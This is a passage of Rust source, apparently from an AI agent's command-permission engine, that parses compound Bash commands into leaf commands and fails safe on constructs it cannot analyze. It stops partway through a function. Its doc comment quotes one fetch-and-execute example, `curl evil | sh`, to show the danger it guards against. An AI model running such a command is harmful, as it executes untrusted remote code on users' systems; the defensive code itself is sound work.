//! Splits a compound Bash command into independently-evaluable leaf commands.
//!
//! The bash-rule engine matches a single regex against the entire command string. That makes
//! compound commands hard to permission safely: a trivially-safe `echo a && ls` never matches a
//! plain `^ls` allow-rule, and a broad allow-rule matched against the *head* of a compound could
//! green-light a dangerous *tail* (`ls && curl evil | sh`). This module uses a real bash parser
//! (`brush-parser`, peg-based, no `unsafe`) to break a command into its leaf simple-commands so
//! each can be evaluated on its own.
//!
//! The safety posture is conservative: any construct we cannot fully reason about (command
//! substitution, subshells, process substitution, here-docs, compound commands, or an
//! unparseable string) produces a [`SplitOutcome::Bail`] so the caller can fail safe rather than
//! guess.

// standard library
use std::{
    collections::{BTreeMap, BTreeSet},
    ops::Range,
    path::Path,
};

// 3rd party crates
use brush_parser::{
    ParserOptions, Token,
    ast::{
        AndOr, Assignment, AssignmentName, AssignmentValue, Command, CommandPrefixOrSuffixItem,
        CompoundCommand, CompoundListItem, IoFileRedirectKind, IoFileRedirectTarget, IoRedirect,
        Pipeline, PipelineTimed, SeparatorOperator, SimpleCommand, Word,
    },
    word::{Parameter, ParameterExpr, TildeExpr, WordPiece, WordPieceWithSource},
};
use serde::Serialize;

// local / workspace deps
use super::tool_rules::strip_cwd_prefix;
use crate::user_config::BashPathAlias;

const NON_STATIC_REDIRECT_REASON: &str = "redirect target is not a static path";
const INVALID_DESCRIPTOR_REASON: &str = "redirect target is not a valid file descriptor";

/// Result of splitting a command into leaves.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum SplitOutcome {
    /// The command parsed into N independently-evaluable simple commands, in execution order.
    Commands(Vec<LeafCommand>),
    /// The command contains a construct we cannot fully analyze; the caller must fail safe.
    Bail(BailReason),
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub(crate) struct AliasBinding {
    pub name: String,
    pub value: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub(crate) enum ParsedRedirectTarget {
    Descriptor {
        match_text: String,
    },
    Filesystem {
        path: String,
        expand_home_tilde: bool,
    },
    Unresolvable {
        reason: String,
    },
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub(crate) struct OutputRedirectEndpoint {
    pub(crate) original_target: String,
    pub(crate) target: ParsedRedirectTarget,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct FilterCommand {
    pub(crate) program: FilterArgument,
    pub(crate) arguments: Vec<FilterArgument>,
    pub(crate) rewrite_prefix: String,
    pub(crate) rewrite_suffix: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct FilterArgument {
    pub(crate) value: String,
    pub(crate) range: Range<usize>,
}

/// A single leaf simple-command extracted from a (possibly compound) command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct LeafCommand {
    pub original: String,
    pub match_text: String,
    pub alias_expanded: Option<String>,
    pub bindings: Vec<AliasBinding>,
    /// Kept separate from rule matching so uncertainty can cap Allow without hiding Deny.
    pub requires_confirmation: Option<String>,
    /// Every output-side endpoint in source order. Command rules do not authorize these targets.
    pub output_redirects: Vec<OutputRedirectEndpoint>,
    pub(crate) filter_command: Option<FilterCommand>,
    declaration_id: Option<usize>,
}

/// Why [`split_command`] could not analyze a command. Carried for diagnostics; every variant maps
/// to "fail safe" at the call site.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub(crate) enum BailReason {
    /// `$(...)`, backticks, or `$((...))` (or a value-carrying parameter expansion that could
    /// embed one) appeared in a word.
    CommandSubstitution,
    /// A `( ... )` subshell.
    Subshell,
    /// A `<(...)` / `>(...)` process substitution.
    ProcessSubstitution,
    /// A here-document or here-string.
    HereDoc,
    /// A brace group, `if`/`for`/`while`/`case`, `[[ ]]`, `((…))`, or function definition.
    CompoundCommand,
    /// The command could not be tokenized or parsed (e.g. unbalanced quotes).
    ParseError,
}

/// Splits `command` into leaf simple-commands, normalizing in-cwd absolute paths to relative form
/// against `cwd` in the same pass.
///
/// Static path values, including parsed quoted or escaped values and known alias expansions, are
/// normalized when they resolve inside `cwd` and contain no `..` component. Parent-containing
/// paths, unquoted brace syntax, and glob paths with dot-prefixed components remain unchanged; an
/// exact-cwd operand becomes `.` rather than being erased. An empty `cwd` disables normalization.
pub(crate) fn split_command(
    command: &str,
    cwd: &str,
    configured_aliases: &BTreeSet<BashPathAlias>,
) -> SplitOutcome {
    let options = ParserOptions::default();

    let tokens = match brush_parser::tokenize_str(command) {
        Ok(tokens) => tokens,
        Err(_) => return SplitOutcome::Bail(BailReason::ParseError),
    };
    let program = match brush_parser::parse_tokens(&tokens, &options) {
        Ok(program) => program,
        Err(_) => return SplitOutcome::Bail(BailReason::ParseError),
    };

    // `SourcePosition.index` is a character offset, so collect chars once and slice/normalize by
    // char index rather than byte index (keeps multi-byte UTF-8 commands correct).
    let chars: Vec<char> = command.chars().collect();
    let mut state = AliasState::new(configured_aliases);
    let mut leaves = Vec::new();

    for complete_command in &program.complete_commands {
        for item in &complete_command.0 {
            if let Err(bail) = collect_list_item(
                item,
                &tokens,
                &chars,
                cwd,
                &options,
                &mut state,
                &mut leaves,
            ) {
                return SplitOutcome::Bail(bail);
            }
        }
    }

    leaves.retain(|leaf| {
        leaf.declaration_id
            .is_none_or(|id| !state.used_declarations.contains(&id))
    });
    SplitOutcome::Commands(leaves)
}

#[derive(Debug, Clone)]
struct ActiveBinding {
    binding: AliasBinding,
    declaration_id: usize,
}

struct AliasState<'a> {
    configured: &'a BTreeSet<BashPathAlias>,
    active: BTreeMap<String, ActiveBinding>,
    used_declarations: BTreeSet<usize>,
    next_declaration_id: usize,
    declarations_allowed: bool,
    redirect_path_context_changed: bool,
}

impl<'a> AliasState<'a> {
    fn new(configured: &'a BTreeSet<BashPathAlias>) -> Self {
        Self {
            configured,
            active: BTreeMap::new(),
            used_declarations: BTreeSet::new(),
            next_declaration_id: 0,
            declarations_allowed: true,
            redirect_path_context_changed: false,
        }
    }

    fn is_configured(&self, name: &str) -> bool {
        self.configured.contains(name)
    }
}

fn collect_list_item(
    item: &CompoundListItem,
    tokens: &[Token],
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    leaves: &mut Vec<LeafCommand>,
) -> Result<(), BailReason> {
    let and_or_list = &item.0;
    if let Some((simple, name, value)) = supported_declaration(item, chars, state) {
        let declaration_id = state.next_declaration_id;
        state.next_declaration_id += 1;

        let mut leaf = leaf_from_simple(simple, tokens, chars, cwd, options, state)?;
        leaf.declaration_id = Some(declaration_id);
        add_confirmation(
            &mut leaf.requires_confirmation,
            format!("path alias `{name}` is assigned but never consumed"),
        );
        leaves.push(leaf);
        state.active.insert(
            name.clone(),
            ActiveBinding {
                binding: AliasBinding { name, value },
                declaration_id,
            },
        );
        return Ok(());
    }

    state.declarations_allowed = false;
    let first_leaf = leaves.len();
    collect_pipeline(
        &and_or_list.first,
        tokens,
        chars,
        cwd,
        options,
        state,
        leaves,
    )?;
    for and_or in &and_or_list.additional {
        let pipeline = match and_or {
            AndOr::And(pipeline) | AndOr::Or(pipeline) => pipeline,
        };
        collect_pipeline(pipeline, tokens, chars, cwd, options, state, leaves)?;
    }
    if matches!(item.1, SeparatorOperator::Async)
        && leaves.len() > first_leaf
        && let Some(filter) = leaves
            .last_mut()
            .and_then(|leaf| leaf.filter_command.as_mut())
    {
        filter.rewrite_suffix.push_str(" &");
    }
    Ok(())
}

fn supported_declaration<'a>(
    item: &'a CompoundListItem,
    chars: &[char],
    state: &AliasState,
) -> Option<(&'a SimpleCommand, String, String)> {
    if !state.declarations_allowed
        || !matches!(item.1, SeparatorOperator::Sequence)
        || !item.0.additional.is_empty()
    {
        return None;
    }

    let pipeline = &item.0.first;
    if pipeline.bang || pipeline.timed.is_some() || pipeline.seq.len() != 1 {
        return None;
    }
    let Command::Simple(simple) = &pipeline.seq[0] else {
        return None;
    };
    let assignment = sole_assignment(simple)?;
    let AssignmentName::VariableName(name) = &assignment.name else {
        return None;
    };
    if !state.is_configured(name) || state.active.contains_key(name) || assignment.append {
        return None;
    }
    let AssignmentValue::Scalar(value) = &assignment.value else {
        return None;
    };
    let source: String = chars
        .get(assignment.loc.start.index..assignment.loc.end.index)?
        .iter()
        .collect();
    if source != format!("{name}={}", value.value)
        || !is_literal_absolute_path(&value.value)
        || !has_explicit_sequence_terminator(assignment, chars)
    {
        return None;
    }

    Some((simple, name.clone(), value.value.clone()))
}

fn sole_assignment(simple: &SimpleCommand) -> Option<&Assignment> {
    if simple.word_or_name.is_some() || simple.suffix.is_some() {
        return None;
    }
    let items = &simple.prefix.as_ref()?.0;
    if items.len() != 1 {
        return None;
    }
    match &items[0] {
        CommandPrefixOrSuffixItem::AssignmentWord(assignment, _) => Some(assignment),
        _ => None,
    }
}

fn is_literal_absolute_path(value: &str) -> bool {
    value.starts_with('/')
        && value.bytes().all(|byte| {
            byte == b'/' || byte.is_ascii_alphanumeric() || b"._@+,:=%-".contains(&byte)
        })
}

fn has_explicit_sequence_terminator(assignment: &Assignment, chars: &[char]) -> bool {
    chars
        .get(assignment.loc.end.index..)
        .unwrap_or_default()
        .iter()
        .find(|ch| !matches!(ch, ' ' | '\t' | '\r'))
        .is_some_and(|ch| matches!(ch, ';' | '\n'))
}

fn collect_pipeline(
    pipeline: &Pipeline,
    tokens: &[Token],
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    leaves: &mut Vec<LeafCommand>,
) -> Result<(), BailReason> {
    let first_leaf = leaves.len();
    for command in &pipeline.seq {
        match command {
            Command::Simple(simple) => {
                let mut leaf = leaf_from_simple(simple, tokens, chars, cwd, options, state)?;
                apply_mutation_barriers(simple, state, &mut leaf.requires_confirmation);
                leaves.push(leaf);
            }
            // A subshell gets its own reason so diagnostics can distinguish it; every other
            // compound construct (brace group, if/for/while/case, `[[ ]]`, `((…))`, function) is
            // out of scope for v1 and bails conservatively.
            Command::Compound(CompoundCommand::Subshell(_), _) => return Err(BailReason::Subshell),
            Command::Compound(_, _) | Command::Function(_) | Command::ExtendedTest(_, _) => {
                return Err(BailReason::CompoundCommand);
            }
        }
    }
    if leaves.len() > first_leaf
        && let Some(filter) = leaves
            .get_mut(first_leaf)
            .and_then(|leaf| leaf.filter_command.as_mut())
    {
        filter.rewrite_prefix = pipeline_rewrite_prefix(pipeline);
    }
    Ok(())
}

fn pipeline_rewrite_prefix(pipeline: &Pipeline) -> String {
    let mut prefix = match pipeline.timed {
        Some(PipelineTimed::Timed(_)) => "time ".to_string(),
        Some(PipelineTimed::TimedWithPosixOutput(_)) => "time -p ".to_string(),
        None => String::new(),
    };
    if pipeline.bang {
        prefix.push_str("! ");
    }
    prefix
}

/// A word collected from a leaf, carrying enough information to reconstruct original,
/// alias-expanded, and cwd-normalized forms without reparsing the command.
struct LeafWord {
    original_value: String,
    expanded_value: String,
    value: String,
    filter_value: String,
    role: WordRole,
    span: Option<(usize, usize)>,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum WordRole {
    CommandName,
    Argument,
    RedirectTarget,
    Other,
}

fn leaf_from_simple(
    simple: &SimpleCommand,
    tokens: &[Token],
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
) -> Result<LeafCommand, BailReason> {
    let mut words = Vec::new();
    let mut bindings = Vec::new();
    let mut requires_confirmation = None;
    let mut output_redirects = Vec::new();

    if let Some(prefix) = &simple.prefix {
        for item in &prefix.0 {
            process_item(
                item,
                chars,
                cwd,
                options,
                state,
                &mut words,
                &mut bindings,
                &mut requires_confirmation,
                &mut output_redirects,
                WordRole::Other,
            )?;
        }
    }
    if let Some(name) = &simple.word_or_name {
        push_word(
            name,
            WordRole::CommandName,
            chars,
            cwd,
            options,
            state,
            &mut words,
            &mut bindings,
            &mut requires_confirmation,
            |_| (),
        )?;
    }
    if let Some(suffix) = &simple.suffix {
        for item in &suffix.0 {
            process_item(
                item,
                chars,
                cwd,
                options,
                state,
                &mut words,
                &mut bindings,
                &mut requires_confirmation,
                &mut output_redirects,
                WordRole::Argument,
            )?;
        }
    }

    let context_failure = if state.redirect_path_context_changed {
        Some(
            "an earlier command may have changed cwd or HOME; filesystem redirect resolution is not trustworthy",
        )
    } else if changes_redirect_path_context(simple) {
        Some(
            "the command may change cwd or HOME; filesystem redirect resolution is not trustworthy",
        )
    } else {
        None
    };
    if let Some(reason) = context_failure {
        let mut path_context_matters = false;
        for endpoint in &mut output_redirects {
            let context_dependent = matches!(
                &endpoint.target,
                ParsedRedirectTarget::Filesystem {
                    path,
                    expand_home_tilde,
                } if *expand_home_tilde || !Path::new(path).is_absolute()
            );
            if context_dependent {
                path_context_matters = true;
                endpoint.target = ParsedRedirectTarget::Unresolvable {
                    reason: reason.to_string(),
                };
            }
        }
        if path_context_matters {
            add_confirmation(&mut requires_confirmation, reason.to_string());
        }
    }

    let leaf_start = leaf_source_start(&words, tokens);
    let original = build_leaf_text(&words, chars, LeafTextStage::Original, leaf_start).text;
    let expanded = build_leaf_text(&words, chars, LeafTextStage::Expanded, leaf_start).text;
    let normalized = build_leaf_text(&words, chars, LeafTextStage::Normalized, leaf_start);
    let filter_command = normalized.program.map(|program| FilterCommand {
        program,
        arguments: normalized.arguments,
        rewrite_prefix: String::new(),
        rewrite_suffix: String::new(),
    });
    Ok(LeafCommand {
        original,
        match_text: normalized.text,
        alias_expanded: words.iter().any(LeafWord::was_expanded).then_some(expanded),
        bindings,
        requires_confirmation,
        output_redirects,
        filter_command,
        declaration_id: None,
    })
}

impl LeafWord {
    fn was_expanded(&self) -> bool {
        self.expanded_value != self.original_value
    }
}

#[allow(clippy::too_many_arguments)]
fn process_item(
    item: &CommandPrefixOrSuffixItem,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    words: &mut Vec<LeafWord>,
    bindings: &mut Vec<AliasBinding>,
    requires_confirmation: &mut Option<String>,
    output_redirects: &mut Vec<OutputRedirectEndpoint>,
    word_role: WordRole,
) -> Result<(), BailReason> {
    match item {
        CommandPrefixOrSuffixItem::Word(word) => push_word(
            word,
            word_role,
            chars,
            cwd,
            options,
            state,
            words,
            bindings,
            requires_confirmation,
            |_| (),
        ),
        CommandPrefixOrSuffixItem::AssignmentWord(_, word) => {
            push_assignment_word(word, chars, options, state, words, requires_confirmation)
        }
        CommandPrefixOrSuffixItem::IoRedirect(redirect) => process_redirect(
            redirect,
            chars,
            cwd,
            options,
            state,
            words,
            bindings,
            requires_confirmation,
            output_redirects,
        ),
        // `<(...)` / `>(...)` runs a command in a subshell; cannot reason about it.
        CommandPrefixOrSuffixItem::ProcessSubstitution(_, _) => {
            Err(BailReason::ProcessSubstitution)
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn process_redirect(
    redirect: &IoRedirect,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    words: &mut Vec<LeafWord>,
    bindings: &mut Vec<AliasBinding>,
    requires_confirmation: &mut Option<String>,
    output_redirects: &mut Vec<OutputRedirectEndpoint>,
) -> Result<(), BailReason> {
    match redirect {
        IoRedirect::File(source_fd, kind, target) => match target {
            IoFileRedirectTarget::Filename(word) => {
                let pushed = push_redirect_target(
                    word,
                    chars,
                    cwd,
                    options,
                    state,
                    words,
                    bindings,
                    requires_confirmation,
                )?;
                if is_output_redirect(kind) {
                    output_redirects.push(pushed.file_endpoint());
                }
                Ok(())
            }
            IoFileRedirectTarget::Duplicate(word) => {
                let pushed = push_redirect_target(
                    word,
                    chars,
                    cwd,
                    options,
                    state,
                    words,
                    bindings,
                    requires_confirmation,
                )?;
                if is_output_redirect(kind) {
                    output_redirects.push(match descriptor_match_text(&pushed.classified_value) {
                        Some(match_text) => OutputRedirectEndpoint {
                            original_target: pushed.original_target,
                            target: ParsedRedirectTarget::Descriptor { match_text },
                        },
                        None if source_fd.is_none() => pushed.file_endpoint(),
                        None => OutputRedirectEndpoint {
                            original_target: pushed.original_target,
                            target: ParsedRedirectTarget::Unresolvable {
                                reason: INVALID_DESCRIPTOR_REASON.to_string(),
                            },
                        },
                    });
                }
                Ok(())
            }
            IoFileRedirectTarget::Fd(fd) => {
                if is_output_redirect(kind) {
                    output_redirects.push(OutputRedirectEndpoint {
                        original_target: fd.to_string(),
                        target: ParsedRedirectTarget::Descriptor {
                            match_text: format!("&{fd}"),
                        },
                    });
                }
                Ok(())
            }
            IoFileRedirectTarget::ProcessSubstitution(_, _) => Err(BailReason::ProcessSubstitution),
        },
        IoRedirect::OutputAndError(word, _append) => {
            let pushed = push_redirect_target(
                word,
                chars,
                cwd,
                options,
                state,
                words,
                bindings,
                requires_confirmation,
            )?;
            output_redirects.push(pushed.file_endpoint());
            Ok(())
        }
        IoRedirect::HereDocument(_, _) | IoRedirect::HereString(_, _) => Err(BailReason::HereDoc),
    }
}

fn is_output_redirect(kind: &IoFileRedirectKind) -> bool {
    matches!(
        kind,
        IoFileRedirectKind::Write
            | IoFileRedirectKind::Append
            | IoFileRedirectKind::Clobber
            | IoFileRedirectKind::ReadAndWrite
            | IoFileRedirectKind::DuplicateOutput
    )
}

fn descriptor_match_text(value: &str) -> Option<String> {
    if value == "-" {
        return Some("&-".to_string());
    }
    let digits = value.strip_suffix('-').unwrap_or(value);
    (!digits.is_empty() && digits.chars().all(|ch| ch.is_ascii_digit()))
        .then(|| format!("&{value}"))
}

struct PushedWord {
    original_target: String,
    classified_value: String,
    target: ParsedRedirectTarget,
}

struct WordPushMetadata<'a> {
    word: &'a Word,
    chars: &'a [char],
    span: Option<(usize, usize)>,
    literal_value: Option<String>,
    expanded: &'a str,
    expand_home_tilde: bool,
    redirect_confirmation: Option<String>,
}

impl WordPushMetadata<'_> {
    fn into_redirect(self) -> PushedWord {
        let original_target = self
            .span
            .and_then(|(start, end)| self.chars.get(start..end))
            .map(|source| source.iter().collect())
            .unwrap_or_else(|| self.word.value.clone());
        let classified_value = self
            .literal_value
            .clone()
            .unwrap_or_else(|| self.expanded.to_string());
        let target = match (self.literal_value, self.redirect_confirmation) {
            (_, Some(reason)) => ParsedRedirectTarget::Unresolvable { reason },
            (Some(path), None) => ParsedRedirectTarget::Filesystem {
                path,
                expand_home_tilde: self.expand_home_tilde,
            },
            (None, None) => ParsedRedirectTarget::Unresolvable {
                reason: NON_STATIC_REDIRECT_REASON.to_string(),
            },
        };
        PushedWord {
            original_target,
            classified_value,
            target,
        }
    }
}

impl PushedWord {
    fn file_endpoint(self) -> OutputRedirectEndpoint {
        OutputRedirectEndpoint {
            original_target: self.original_target,
            target: self.target,
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn push_redirect_target(
    word: &Word,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    words: &mut Vec<LeafWord>,
    bindings: &mut Vec<AliasBinding>,
    requires_confirmation: &mut Option<String>,
) -> Result<PushedWord, BailReason> {
    push_word(
        word,
        WordRole::RedirectTarget,
        chars,
        cwd,
        options,
        state,
        words,
        bindings,
        requires_confirmation,
        |metadata| metadata.into_redirect(),
    )
}

#[allow(clippy::too_many_arguments)]
fn push_word<R>(
    word: &Word,
    role: WordRole,
    chars: &[char],
    cwd: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    words: &mut Vec<LeafWord>,
    bindings: &mut Vec<AliasBinding>,
    requires_confirmation: &mut Option<String>,
    finish: impl FnOnce(WordPushMetadata<'_>) -> R,
) -> Result<R, BailReason> {
    let WordAnalysis {
        expanded,
        literal_value,
        non_alias_normalization_safe,
        expand_home_tilde,
        analyzed_bindings,
        requires_confirmation: analysis_confirmation,
        mut redirect_confirmation,
    } = analyze_word(&word.value, options, state, role)?;
    let is_redirect_target = matches!(role, WordRole::RedirectTarget);
    let alias_expanded = !analyzed_bindings.is_empty();
    for binding in analyzed_bindings {
        if !bindings.contains(&binding) {
            bindings.push(binding);
        }
    }
    if let Some(reason) = analysis_confirmation {
        add_confirmation(requires_confirmation, reason.clone());
        if is_redirect_target {
            add_confirmation(&mut redirect_confirmation, reason);
        }
    }

    let normalization = normalize_word_for_match(
        &expanded,
        literal_value.as_deref(),
        cwd,
        alias_expanded,
        non_alias_normalization_safe,
    );
    if normalization.requires_confirmation {
        let reason = "path alias uses unsupported quoting or escaping".to_string();
        add_confirmation(requires_confirmation, reason.clone());
        if is_redirect_target {
            add_confirmation(&mut redirect_confirmation, reason);
        }
    }
    let span = word.loc.as_ref().and_then(|loc| {
        let (start, end) = (loc.start.index, loc.end.index);
        (start <= end && end <= chars.len()).then_some((start, end))
    });
    // Match filters against the decoded literal unless normalization changed the policy-visible value.
    let filter_value = if normalization.value == expanded {
        literal_value
            .clone()
            .unwrap_or_else(|| normalization.value.clone())
    } else {
        normalization.value.clone()
    };
    let pushed = finish(WordPushMetadata {
        word,
        chars,
        span,
        literal_value,
        expanded: &expanded,
        expand_home_tilde,
        redirect_confirmation,
    });
    words.push(LeafWord {
        original_value: word.value.clone(),
        expanded_value: expanded,
        value: normalization.value,
        filter_value,
        role,
        span,
    });
    Ok(pushed)
}

fn push_assignment_word(
    word: &Word,
    chars: &[char],
    options: &ParserOptions,
    state: &AliasState,
    words: &mut Vec<LeafWord>,
    requires_confirmation: &mut Option<String>,
) -> Result<(), BailReason> {
    let scan = scan_word(&word.value, options, state)?;
    if !scan.supported.is_empty() || !scan.unsupported.is_empty() {
        add_confirmation(
            requires_confirmation,
            "path aliases referenced inside assignments are not statically expanded".to_string(),
        );
    }
    let span = word.loc.as_ref().and_then(|loc| {
        let (start, end) = (loc.start.index, loc.end.index);
        (start <= end && end <= chars.len()).then_some((start, end))
    });
    words.push(LeafWord {
        original_value: word.value.clone(),
        expanded_value: word.value.clone(),
        value: word.value.clone(),
        filter_value: word.value.clone(),
        role: WordRole::Other,
        span,
    });
    Ok(())
}

struct WordAnalysis {
    expanded: String,
    literal_value: Option<String>,
    non_alias_normalization_safe: bool,
    expand_home_tilde: bool,
    analyzed_bindings: Vec<AliasBinding>,
    requires_confirmation: Option<String>,
    redirect_confirmation: Option<String>,
}

struct ParameterScan {
    total_expansions: usize,
    supported: Vec<(String, usize, usize)>,
    unsupported: Vec<String>,
    static_parts: Option<Vec<StaticWordPart>>,
    alias_static_supported: bool,
    has_unquoted_open_brace: bool,
    has_unquoted_close_brace: bool,
    has_unquoted_glob: bool,
    expand_home_tilde: bool,
}

impl ParameterScan {
    fn push_static_part(&mut self, part: StaticWordPart) {
        if let Some(parts) = &mut self.static_parts {
            parts.push(part);
        }
    }

    fn invalidate_static_word(&mut self) {
        self.static_parts = None;
    }
}

enum StaticWordPart {
    Literal(String),
    Alias(String),
}

fn analyze_word(
    value: &str,
    options: &ParserOptions,
    state: &mut AliasState,
    role: WordRole,
) -> Result<WordAnalysis, BailReason> {
    let scan = scan_word(value, options, state)?;
    let mut requires_confirmation = scan.unsupported.into_iter().next();
    let mut analyzed_bindings = Vec::new();
    let mut expanded = value.to_string();
    let mut literal_value = scan
        .static_parts
        .as_deref()
        .and_then(|parts| render_static_word(parts, None));
    if let Some((name, start, end)) = scan.supported.into_iter().next() {
        if scan.total_expansions != 1 {
            add_confirmation(
                &mut requires_confirmation,
                format!(
                    "path alias `{name}` appears with multiple parameter expansions in one word"
                ),
            );
        } else if let Some(active) = state.active.get(&name).cloned() {
            expanded = replace_word_span(value, start, end, &active.binding.value)
                .ok_or(BailReason::ParseError)?;
            state.used_declarations.insert(active.declaration_id);
            literal_value = if scan.alias_static_supported {
                scan.static_parts.as_deref().and_then(|parts| {
                    render_static_word(parts, Some((&name, &active.binding.value)))
                })
            } else {
                None
            };
            analyzed_bindings.push(active.binding);
            if matches!(role, WordRole::CommandName) {
                add_confirmation(
                    &mut requires_confirmation,
                    format!("path alias `{name}` expands in command position"),
                );
            }
        } else {
            add_confirmation(
                &mut requires_confirmation,
                format!("path alias `{name}` has no supported active binding"),
            );
        }
    }

    let has_unquoted_brace = scan.has_unquoted_open_brace && scan.has_unquoted_close_brace;
    let non_alias_normalization_safe = !(has_unquoted_brace
        || scan.has_unquoted_glob
            && literal_value
                .as_deref()
                .is_some_and(has_dot_prefixed_component));
    let mut redirect_confirmation = None;
    if matches!(role, WordRole::RedirectTarget) {
        if literal_value.is_none() {
            add_confirmation(
                &mut redirect_confirmation,
                NON_STATIC_REDIRECT_REASON.to_string(),
            );
        }
        if has_unquoted_brace {
            add_confirmation(
                &mut redirect_confirmation,
                "redirect target contains unquoted brace syntax".to_string(),
            );
        }
        if scan.has_unquoted_glob {
            add_confirmation(
                &mut redirect_confirmation,
                "redirect target contains a glob expression".to_string(),
            );
        }
    }
    Ok(WordAnalysis {
        expanded,
        literal_value,
        non_alias_normalization_safe,
        expand_home_tilde: scan.expand_home_tilde,
        analyzed_bindings,
        requires_confirmation,
        redirect_confirmation,
    })
}

fn scan_word(
    value: &str,
    options: &ParserOptions,
    state: &AliasState,
) -> Result<ParameterScan, BailReason> {
    let pieces = brush_parser::word::parse(value, options).map_err(|_| BailReason::ParseError)?;
    let mut scan = ParameterScan {
        total_expansions: 0,
        supported: Vec::new(),
        unsupported: Vec::new(),
        static_parts: Some(Vec::new()),
        alias_static_supported: true,
        has_unquoted_open_brace: false,
        has_unquoted_close_brace: false,
        has_unquoted_glob: false,
        expand_home_tilde: false,
    };
    scan_pieces(&pieces, false, false, value, state, &mut scan)?;
    Ok(scan)
}

fn render_static_word(parts: &[StaticWordPart], binding: Option<(&str, &str)>) -> Option<String> {
    let mut rendered = String::new();
    for part in parts {
        match part {
            StaticWordPart::Literal(text) => rendered.push_str(text),
            StaticWordPart::Alias(name) => {
                let (bound_name, value) = binding?;
                if name != bound_name {
                    return None;
                }
                rendered.push_str(value);
            }
        }
    }
    Some(rendered)
}

fn contains_unquoted_extglob(text: &str) -> bool {
    text.as_bytes()
        .windows(2)
        .any(|pair| pair[1] == b'(' && matches!(pair[0], b'@' | b'+' | b'!'))
}

fn scan_pieces(
    pieces: &[WordPieceWithSource],
    localized: bool,
    quoted: bool,
    value: &str,
    state: &AliasState,
    scan: &mut ParameterScan,
) -> Result<(), BailReason> {
    for piece in pieces {
        match &piece.piece {
            WordPiece::CommandSubstitution(_)
            | WordPiece::BackquotedCommandSubstitution(_)
            | WordPiece::ArithmeticExpression(_) => return Err(BailReason::CommandSubstitution),
            WordPiece::Text(text) => {
                scan.push_static_part(StaticWordPart::Literal(text.clone()));
                if !quoted {
                    scan.has_unquoted_open_brace |= text.contains('{');
                    scan.has_unquoted_close_brace |= text.contains('}');
                    scan.has_unquoted_glob |=
                        text.contains(['*', '?', '[']) || contains_unquoted_extglob(text);
                }
            }
            WordPiece::SingleQuotedText(text) => {
                scan.push_static_part(StaticWordPart::Literal(text.clone()));
                scan.alias_static_supported = false;
            }
            WordPiece::EscapeSequence(text) => {
                let Some(unescaped) = text.strip_prefix('\\') else {
                    scan.invalidate_static_word();
                    scan.alias_static_supported = false;
                    continue;
                };
                scan.push_static_part(StaticWordPart::Literal(unescaped.to_string()));
                scan.alias_static_supported = false;
            }
            WordPiece::DoubleQuotedSequence(inner) => {
                scan_pieces(inner, localized, true, value, state, scan)?;
            }
            WordPiece::GettextDoubleQuotedSequence(inner) => {
                scan.alias_static_supported = false;
                scan.invalidate_static_word();
                scan_pieces(inner, true, true, value, state, scan)?;
            }
            WordPiece::ParameterExpansion(expr) => {
                scan.total_expansions += 1;
                let Some(name) = parameter_alias_name(expr) else {
                    scan.alias_static_supported = false;
                    scan.invalidate_static_word();
                    if !is_plain_parameter(expr) {
                        return Err(BailReason::CommandSubstitution);
                    }
                    continue;
                };
                if !state.is_configured(name) {
                    scan.alias_static_supported = false;
                    scan.invalidate_static_word();
                    if !is_plain_parameter(expr) {
                        return Err(BailReason::CommandSubstitution);
                    }
                    continue;
                }

                if localized || !is_supported_alias_parameter(expr) {
                    scan.alias_static_supported = false;
                    scan.invalidate_static_word();
                    if contains_hidden_execution(value) {
                        return Err(BailReason::CommandSubstitution);
                    }
                    scan.unsupported.push(format!(
                        "path alias `{name}` uses a localized, indirect, or dynamic expansion"
                    ));
                } else {
                    scan.push_static_part(StaticWordPart::Alias(name.to_string()));
                    scan.supported
                        .push((name.to_string(), piece.start_index, piece.end_index));
                }
            }
            WordPiece::TildeExpansion(TildeExpr::Home) => {
                // Resolution expands only the current user's plain `~`; named-user and shell-state
                // tilde forms remain dynamic and therefore require confirmation.
                scan.expand_home_tilde = true;
                scan.push_static_part(StaticWordPart::Literal("~".to_string()));
            }
            WordPiece::AnsiCQuotedText(_) | WordPiece::TildeExpansion(_) => {
                scan.alias_static_supported = false;
                scan.invalidate_static_word();
            }
        }
    }
    Ok(())
}

fn parameter_alias_name(expr: &ParameterExpr) -> Option<&str> {
    let parameter = match expr {
        ParameterExpr::Parameter { parameter, .. }
        | ParameterExpr::UseDefaultValues { parameter, .. }
        | ParameterExpr::AssignDefaultValues { parameter, .. }
        | ParameterExpr::IndicateErrorIfNullOrUnset { parameter, .. }
        | ParameterExpr::UseAlternativeValue { parameter, .. }
        | ParameterExpr::ParameterLength { parameter, .. }
        | ParameterExpr::RemoveSmallestSuffixPattern { parameter, .. }
        | ParameterExpr::RemoveLargestSuffixPattern { parameter, .. }
        | ParameterExpr::RemoveSmallestPrefixPattern { parameter, .. }
        | ParameterExpr::RemoveLargestPrefixPattern { parameter, .. }
        | ParameterExpr::Substring { parameter, .. }
        | ParameterExpr::Transform { parameter, .. }
        | ParameterExpr::UppercaseFirstChar { parameter, .. }
        | ParameterExpr::UppercasePattern { parameter, .. }
        | ParameterExpr::LowercaseFirstChar { parameter, .. }
        | ParameterExpr::LowercasePattern { parameter, .. }
        | ParameterExpr::ReplaceSubstring { parameter, .. } => parameter,
        ParameterExpr::VariableNames { prefix, .. } => return Some(prefix),
